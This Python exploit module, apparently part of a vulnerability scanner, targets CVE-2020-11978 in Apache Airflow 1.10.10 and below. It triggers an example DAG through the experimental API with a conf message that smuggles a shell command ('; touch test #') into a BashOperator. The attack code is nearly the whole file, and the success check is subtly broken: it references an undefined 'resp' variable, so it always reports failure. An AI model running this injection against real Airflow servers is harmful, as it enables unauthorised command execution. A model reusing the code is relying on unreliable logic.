import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Airflow <= 1.10.10 - 'Example Dag' Remote Code Execution''',
        "description": '''An issue was found in Apache Airflow versions 1.10.10 and below. A remote code/command injection vulnerability was discovered in one of the example DAGs shipped with Airflow which would allow any authenticated user to run arbitrary commands as the user running airflow worker/scheduler (depending on the executor in use). If you already have examples disabled by setting load_examples=False in the config then you are not vulnerable.''',
        "severity": "high",
        "references": [
            "https://github.com/pberba/CVE-2020-11978", 
            "https://nvd.nist.gov/vuln/detail/CVE-2020-11978", 
            "https://twitter.com/wugeej/status/1400336603604668418"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2020-11978",
            "cwe-id": "CWE-77"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "apache", "airflow", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/experimental/test"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/experimental/dags/example_trigger_target_dag/paused/false"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/experimental/dags/example_trigger_target_dag/dag_runs"""
        method = "POST"
        data = """{"conf": {"message": "\"; touch test #"}}"""
        headers = {'Accept': '*/*', 'Content-Type': 'application/json'}
        resp2 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        tmp = re.findall(r'"execution_date":"([0-9-A-Z:+]+)"', resp2.text)
        if tmp:
            exec_date = tmp[0]
        else:
            result["success"] = False
            return result

        path = """/api/experimental/dags/example_trigger_target_dag/dag_runs/{exec_date}/tasks/bash_task""".format(exec_date=exec_date)
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp3 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if '"operator":"BashOperator"' in resp3.text and "application/json" in str(resp.headers):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url